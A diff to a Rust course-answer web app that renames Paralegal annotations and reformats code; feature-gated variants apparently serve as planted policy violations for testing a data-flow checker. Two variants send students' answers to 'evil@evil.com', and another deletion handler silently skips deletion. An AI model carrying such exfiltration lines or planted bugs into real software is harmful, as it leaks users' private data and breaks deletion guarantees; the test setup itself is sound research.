@@ -10,19 +10,22 @@ use rocket::form::{Form, FromForm};
 use rocket::response::Redirect;
 use rocket::State;
 use rocket_dyn_templates::Template;
-use std::collections::HashMap;
 use std::collections::hash_map::DefaultHasher;
+use std::collections::HashMap;
 use std::hash::Hash;
 use std::sync::{Arc, Mutex};
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(sensitive))]
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::output_types(crate::questions::LectureAnswer))]
+#[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(sensitive))]
+#[cfg_attr(
+    not(feature = "v-ann-lib"),
+    paralegal::output_types(crate::questions::LectureAnswer)
+)]
 #[derive(Debug, FromForm)]
 pub(crate) struct LectureQuestionSubmission {
     answers: HashMap<u64, String>,
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(sensitive))]
+#[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(sensitive))]
 #[derive(Serialize)]
 pub(crate) struct LectureQuestion {
     pub id: u64,
@@ -39,7 +42,7 @@ pub(crate) struct LectureQuestionsContext {
     pub parent: &'static str,
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(sensitive))]
+#[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(sensitive))]
 #[derive(Serialize)]
 struct LectureAnswer {
     id: u64,
@@ -112,16 +115,18 @@ pub(crate) fn leclist(
     Template::render("leclist", &ctx)
 }
 
-pub enum Either<A,B> {
+pub enum Either<A, B> {
     Left(A),
     Right(B),
 }
 
-#[dfpp::marker(source)]
+#[paralegal::marker(source)]
 fn get_one_answer(bg: &mut MySqlBackend, user: &str, key: u64) -> LectureAnswer {
-    let res = bg.prep_exec("SELECT * FROM answers WHERE email = ? AND num = ?", vec![user.into(), key.into()]);
-    res
-        .into_iter()
+    let res = bg.prep_exec(
+        "SELECT * FROM answers WHERE email = ? AND num = ?",
+        vec![user.into(), key.into()],
+    );
+    res.into_iter()
         .map(|r| LectureAnswer {
             id: from_value(r[2].clone()),
             lec: from_value(r[1].clone()),
@@ -137,15 +142,17 @@ fn get_one_answer(bg: &mut MySqlBackend, user: &str, key: u64) -> LectureAnswer 
         .unwrap()
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(source))]
+#[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(source))]
 fn get_answers(bg: &mut MySqlBackend, key: Either<u64, &str>) -> Vec<LectureAnswer> {
     let (where_, key) = match key {
         Either::Left(lec) => ("lec", lec.into()),
         Either::Right(usr) => ("email", usr.into()),
     };
-    let res = bg.prep_exec(&format!("SELECT * FROM answers WHERE {where_} = ?"), vec![key]);
-    res
-        .into_iter()
+    let res = bg.prep_exec(
+        &format!("SELECT * FROM answers WHERE {where_} = ?"),
+        vec![key],
+    );
+    res.into_iter()
         .map(|r| LectureAnswer {
             id: from_value(r[2].clone()),
             lec: from_value(r[1].clone()),
@@ -162,7 +169,7 @@ fn get_answers(bg: &mut MySqlBackend, key: Either<u64, &str>) -> Vec<LectureAnsw
 
 #[cfg_attr(feature = "edit-dis-3-a", dfpp::analyze)]
 #[cfg_attr(feature = "edit-dis-3-c", dfpp::analyze)]
-#[cfg_attr(feature = "v-ann-lib", dfpp::marker(request_generated, arguments = [0]))]
+#[cfg_attr(feature = "v-ann-lib", paralegal::marker(request_generated, arguments = [0]))]
 #[get("/<num>")]
 pub(crate) fn answers(
     _admin: Admin,
@@ -172,24 +179,24 @@ pub(crate) fn answers(
     let mut bg = backend.lock().unwrap();
     let answers = get_answers(&mut bg, Either::Left(num as u64));
 
-	#[cfg(feature = "edit-dis-3-c")]
-	email::my_send(
-		bg.log.clone(),
-		"".to_string(),
-		vec!["evil@evil.com".to_string()],
-		format!("{} questions", num),
-		format!(
-			"{}",
-			answers
-				.iter()
-				.map(|a| format!("Question {}:\n{}", a.id, a.answer))
-				.collect::<Vec<_>>()
-				.join("\n-----\n")
-		),
-	)
-	.expect("failed to send email");
+    #[cfg(feature = "edit-dis-3-c")]
+    email::my_send(
+        bg.log.clone(),
+        "".to_string(),
+        vec!["evil@evil.com".to_string()],
+        format!("{} questions", num),
+        format!(
+            "{}",
+            answers
+                .iter()
+                .map(|a| format!("Question {}:\n{}", a.id, a.answer))
+                .collect::<Vec<_>>()
+                .join("\n-----\n")
+        ),
+    )
+    .expect("failed to send email");
 
-	drop(bg);
+    drop(bg);
 
     let ctx = LectureAnswersContext {
         lec_id: num,
@@ -248,23 +255,34 @@ pub(crate) fn questions(
 }
 
 impl LectureAnswer {
-    #[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(deletes, arguments = [0]))]
+    #[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(deletes, arguments = [0]))]
     fn delete_answer(self, bg: &mut MySqlBackend) {
-        bg.delete("answers", &[("lec", self.lec.into()), ("q", self.id.into()), ("email", self.user.into())]);
+        bg.delete(
+            "answers",
+            &[
+                ("lec", self.lec.into()),
+                ("q", self.id.into()),
+                ("email", self.user.into()),
+            ],
+        );
     }
 }
 
 impl ApiKey {
-    #[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(deletes, arguments = [0]))]
+    #[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(deletes, arguments = [0]))]
     fn delete_apikey(self, bg: &mut MySqlBackend) {
         bg.delete("users", &[("email", self.user.into())])
     }
 }
 
 #[cfg(feature = "edit-del-3-b")]
-#[dfpp::analyze]
+#[paralegal::analyze]
 #[post("/answer/delete/<num>")]
-pub(crate) fn delete_answer_handler(apikey: ApiKey, num: u64, backend: &State<Arc<Mutex<MySqlBackend>>>) -> Redirect {
+pub(crate) fn delete_answer_handler(
+    apikey: ApiKey,
+    num: u64,
+    backend: &State<Arc<Mutex<MySqlBackend>>>,
+) -> Redirect {
     get_one_answer(&mut backend.lock().unwrap(), &apikey.user, num);
     Redirect::to("/")
 }
@@ -277,7 +295,10 @@ fn delete_my_answers(bg: &mut MySqlBackend, answers: Vec<LectureAnswer>) {
 
 #[cfg(feature = "edit-del-3-c")]
 #[post("/forget_answers")]
-fn delete_my_answers_controller(apikey: ApiKey, backend: &State<Arc<Mutex<MySqlBackend>>>) -> Redirect {
+fn delete_my_answers_controller(
+    apikey: ApiKey,
+    backend: &State<Arc<Mutex<MySqlBackend>>>,
+) -> Redirect {
     let mut bg = backend.lock().unwrap();
     let key = apikey.user.as_str();
     let mut answers = get_answers(&mut bg, Either::Right(key));
@@ -287,7 +308,7 @@ fn delete_my_answers_controller(apikey: ApiKey, backend: &State<Arc<Mutex<MySqlB
     Redirect::to("/")
 }
 
-#[dfpp::analyze]
+#[paralegal::analyze]
 #[post("/forget")]
 pub(crate) fn forget_user(apikey: ApiKey, backend: &State<Arc<Mutex<MySqlBackend>>>) -> Redirect {
     let mut bg = backend.lock().unwrap();
@@ -337,7 +358,10 @@ pub(crate) fn forget_user(apikey: ApiKey, backend: &State<Arc<Mutex<MySqlBackend
     Redirect::to("/")
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(safe_source_with_bless, return))]
+#[cfg_attr(
+    not(feature = "v-ann-lib"),
+    paralegal::marker(safe_source_with_bless, return)
+)]
 fn get_presenters(bg: &mut MySqlBackend, num: u8) -> Vec<String> {
     let mut presenter_emails = vec![];
     let presenters_res = bg.prep_exec("SELECT * FROM presenters WHERE lec = ?;", vec![num.into()]);
@@ -348,27 +372,36 @@ fn get_presenters(bg: &mut MySqlBackend, num: u8) -> Vec<String> {
     presenter_emails
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(safe_source_with_bless, return))]
+#[cfg_attr(
+    not(feature = "v-ann-lib"),
+    paralegal::marker(safe_source_with_bless, return)
+)]
 fn get_all_presenters(bg: &mut MySqlBackend) -> Vec<Vec<Value>> {
     bg.prep_exec("SELECT * FROM presenters;", vec![])
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(bless_safe_source, return))]
+#[cfg_attr(
+    not(feature = "v-ann-lib"),
+    paralegal::marker(bless_safe_source, return)
+)]
 fn get_num(num: u8) -> u8 {
-	num
+    num
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(safe_source_with_bless, return))]
+#[cfg_attr(
+    not(feature = "v-ann-lib"),
+    paralegal::marker(safe_source_with_bless, return)
+)]
 fn get_staff(config: &State<Config>) -> Vec<String> {
-	config.staff.clone()
+    config.staff.clone()
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(safe_source, return))]
+#[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(safe_source, return))]
 fn get_admins(config: &State<Config>) -> Vec<String> {
-	config.admins.clone()
+    config.admins.clone()
 }
 
-#[cfg_attr(not(feature = "v-ann-lib"), dfpp::marker(scopes, return))]
+#[cfg_attr(not(feature = "v-ann-lib"), paralegal::marker(scopes_store, return))]
 fn scopes_argument<T>(field: T) -> T {
     field
 }
@@ -383,8 +416,8 @@ pub(crate) fn questions_submit(
 ) -> Redirect {
     questions_submit_internal(apikey, num, data, backend, config)
 }
-#[dfpp::analyze]
-#[cfg_attr(feature = "v-ann-lib", dfpp::marker(request_generated, arguments = [0]))]
+#[paralegal::analyze]
+#[cfg_attr(feature = "v-ann-lib", paralegal::marker(request_generated, arguments = [0]))]
 pub(crate) fn questions_submit_internal(
     apikey: ApiKey,
     num: u8,
@@ -392,33 +425,33 @@ pub(crate) fn questions_submit_internal(
     backend: &State<Arc<Mutex<MySqlBackend>>>,
     config: &State<Config>,
 ) -> Redirect {
-	let num = get_num(num);
+    let num = get_num(num);
     let mut bg = backend.lock().unwrap();
     let vnum: Value = (num as u64).into();
     let ts: Value = Local::now().naive_local().into();
 
-	cfg_if! {
-		if #[cfg(feature = "edit-dis-2-a")] {
-			let mut presenter_emails: Vec<String> = vec![];
+    cfg_if! {
+        if #[cfg(feature = "edit-dis-2-a")] {
+            let mut presenter_emails: Vec<String> = vec![];
 
-			let mut all_presenters = get_all_presenters(&mut bg);
-			for p in all_presenters {
-				let lecnum: u8 = from_value(p[0].clone());
-				if lecnum == num {
-					presenter_emails.push(from_value(p[1].clone()));
-				}
-			}
-		} else if #[cfg(feature = "edit-dis-2-b")] {
-			let mut presenter_emails = get_staff(config);
-		} else if #[cfg(feature = "edit-dis-2-c")] {
-			let mut presenter_emails = get_presenters(&mut bg, 0);
-		} else {
-			let mut presenter_emails = get_presenters(&mut bg, num);
-		}
-	}
+            let mut all_presenters = get_all_presenters(&mut bg);
+            for p in all_presenters {
+                let lecnum: u8 = from_value(p[0].clone());
+                if lecnum == num {
+                    presenter_emails.push(from_value(p[1].clone()));
+                }
+            }
+        } else if #[cfg(feature = "edit-dis-2-b")] {
+            let mut presenter_emails = get_staff(config);
+        } else if #[cfg(feature = "edit-dis-2-c")] {
+            let mut presenter_emails = get_presenters(&mut bg, 0);
+        } else {
+            let mut presenter_emails = get_presenters(&mut bg, num);
+        }
+    }
 
     for (id, answer) in &data.answers {
-        cfg_if!{
+        cfg_if! {
             if #[cfg(feature = "edit-sc-1-a")] {
                 let mut hasher = DefaultHasher::new();
                 apikey.user.hash(&mut hasher);
@@ -433,7 +466,7 @@ pub(crate) fn questions_submit_internal(
                 let key = &apikey.user.to_string();
             }
         }
-        cfg_if!{
+        cfg_if! {
             if #[cfg(feature = "edit-sc-1-b")] {
                 let num = key.into();
                 let key = vnum.clone().into();
@@ -442,7 +475,7 @@ pub(crate) fn questions_submit_internal(
                 let num = vnum.clone().into();
             }
         }
-        let rec: Vec<Value> = vec![ 
+        let rec: Vec<Value> = vec![
             scopes_argument(key),
             num,
             (*id).into(),
@@ -452,42 +485,42 @@ pub(crate) fn questions_submit_internal(
         bg.replace("answers", rec);
     }
 
-	let answer_log = format!(
-		"{}",
-		data.answers
-			.iter()
-			.map(|(i, t)| format!("Question {}:\n{}", i, t))
-			.collect::<Vec<_>>()
-			.join("\n-----\n")
-	);
+    let answer_log = format!(
+        "{}",
+        data.answers
+            .iter()
+            .map(|(i, t)| format!("Question {}:\n{}", i, t))
+            .collect::<Vec<_>>()
+            .join("\n-----\n")
+    );
 
-	#[cfg(feature = "edit-dis-3-b")]
-	println!("{}", answer_log);
+    #[cfg(feature = "edit-dis-3-b")]
+    println!("{}", answer_log);
 
     if config.send_emails {
-		let mut recipients = vec![];
-		cfg_if! {
+        let mut recipients = vec![];
+        cfg_if! {
             if #[cfg(feature = "edit-dis-1-a")] {
-				if num < 90 {
-					recipients.append(&mut get_staff(config));
-				} else {
-					recipients.append(&mut get_admins(config));
-				};
+                if num < 90 {
+                    recipients.append(&mut get_staff(config));
+                } else {
+                    recipients.append(&mut get_admins(config));
+                };
             } else if #[cfg(feature = "edit-dis-1-b")] {
                 recipients = get_staff(config);
             } else if #[cfg(feature = "edit-dis-1-c")] {
                 recipients = if num < 90 {
-					get_staff(config)
-				} else {
-					get_admins(config)
-				};
-				recipients.push("evil@evil.com".to_string());
+                    get_staff(config)
+                } else {
+                    get_admins(config)
+                };
+                recipients.push("evil@evil.com".to_string());
             } else {
                 recipients = if num < 90 {
-					get_staff(config)
-				} else {
-					get_admins(config)
-				};
+                    get_staff(config)
+                } else {
+                    get_admins(config)
+                };
             }
         }
         recipients.append(&mut presenter_emails);
